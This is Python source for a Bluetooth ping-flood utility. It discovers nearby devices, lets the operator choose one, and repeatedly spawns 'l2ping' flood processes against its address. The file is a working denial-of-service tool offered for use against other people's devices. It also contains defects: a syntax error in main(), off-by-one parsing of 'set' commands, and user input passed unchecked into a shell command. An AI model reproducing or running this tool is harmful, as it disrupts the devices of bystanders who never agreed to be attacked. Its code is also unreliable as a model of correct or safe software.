
# Bpong - Bluetooth Ping Flood Utility v0.1
# Author: Franco Barpp Gomes (https://github.com/Hyodar)

# -*- coding: utf-8 -*-

# Imported modules
# -----------------------------------------------------------------------------

import bluetooth as bt
import subprocess
from time import sleep

# Globals
# -----------------------------------------------------------------------------

params = {
    'bdaddr': '',
    'name': '',
    'packet_sz': '600',
    'interface': 'hci0'
}

stored_scan = {
    'bdaddrs': [],
    'names': []
}

# Classes
# -----------------------------------------------------------------------------

class Command:

    def __init__(self, name, aliases, on_call, help):
        self.name = name
        self.aliases = aliases
        self.on_call = on_call
        self.help = help
    
    def run(self):
        self.on_call()
    
    def parse(self, comm):
        if comm == self.name or comm in self.aliases:
            self.run()
            return 1
        return 0

# Functions
# -----------------------------------------------------------------------------

"""
help_message()
    Prints a help message about the commands
"""

def help_message():

    print("Bpong v0.1")
    print("Commands:")
    print("\tscan -> Scans for nearby devices")
    print("\trun -> Runs the attack")
    print("\tchg -> Changes the target based on the last scan")
    print("\tset [param] [value] -> Sets parameters (interface, packet_sz,\
          name, bdaddr")
    print("\tsettings -> Prints current settings")
    print("\texit -> Quits the script")

# -----------------------------------------------------------------------------

"""
choose_target()
    Chooses a target from the last scan
"""

def choose_target():

    target = int(input('[*] Choose target: '))
    params['bdaddr'] = stored_scan['bdaddrs'][target]
    params['name'] = stored_scan['names'][target]

# -----------------------------------------------------------------------------

"""
change_target()
    Changes the target to one from the last scan
"""

def change_target():

    for i in range(len(stored_scan['bdaddrs'])):
        print('\t{}. NAME: {} | ADDR: {}'.format(i, stored_scan['names'][i],
              stored_scan['bdaddrs'][i]))
    choose_target()

# -----------------------------------------------------------------------------

"""
scan()
    Scans nearby bluetooth devices to target
"""

def scan():

    devices = bt.discover_devices(lookup_names=True)
    stored_scan['bdaddrs'] = []
    stored_scan['names'] = []

    index = 0
    for bdaddr, name in devices:
        stored_scan['bdaddrs'].append(bdaddr)
        stored_scan['names'].append(name)
        
        print('\t{}. NAME: {} | ADDR: {}'.format(index, name, bdaddr))
        index += 1
    
    choose_target()
    print("Everything set up!")

# -----------------------------------------------------------------------------

"""
settings_report()
    Prints a report with all the parameters being used on the attack
"""

def settings_report():
    print("[*] Settings: \n\t\
        BDADDR: {}\n\t\
        NAME: {}\n\t\
        PACKET SIZE: {}\n\t \
        INTERFACE:{}".format(params['bdaddr'], params['name'],
                             params['packet_sz'], params['interface']))

# -----------------------------------------------------------------------------

"""
run()
    Runs the attack with the parameters set on 'scan' or 'set'
"""

def run():
    if not (params['bdaddr']):
        print("[!] Missing parameters! Run scan or set them manually.")
        return
    
    print("[*] Running attack...")
    settings_report()

    try:
        for i in range (10000):
            xterm_1 = 'l2ping -i {} -s {} -f {} &'.format(params['interface'],
                                                          params['packet_sz'],
                                                          params['bdaddr'])
            subprocess.Popen(xterm_1, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, shell=True)

            sleep(3)
    except (KeyboardInterrupt, OSError):
        print("[!] Exception! Exiting...")

# -----------------------------------------------------------------------------

"""
set_params(comm)
    Parameters: - str comm: Inserted command

    Runs the attack with the parameters set on 'scan' or 'set'
"""

def set_params(comm):
    comm = comm.split(' ')    
    params[comm[2]] = comm[3]

# -----------------------------------------------------------------------------

"""
parse_comm(comm)
    Parameters: - str comm: Inserted command
        
    Parses the inserted command to run each function and get additional info
"""

def parse_comm(comm):
    if not comm:
        print("[!] Insert a command")

    if comm in ['scan', 's']:
        scan()
    elif comm in ['run', 'flood', 'ping', 'r']:
        run()
    elif comm in ['chg', 'new']:
        change_target()
    elif comm.startswith('set'):
        set_params(comm)
    elif comm in ['commands', 'help']:
        print("[*] scan, run, set [] [], settings, exit")
    elif comm == 'settings':
        settings_report()
    elif comm in ['exit', 'e', 'quit', 'q']:
        exit()
    else:
        print("[!] The command {} does not exist".format(comm))

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------

def main():

    commands = []

    commands.append(Command(name='scan', aliases['s'], on_call=scan,
                    help = 'scans for nearby devices'))

    while True:
        comm = input('<bpong> ')
        parse_comm(comm)

if __name__ == '__main__':
    main()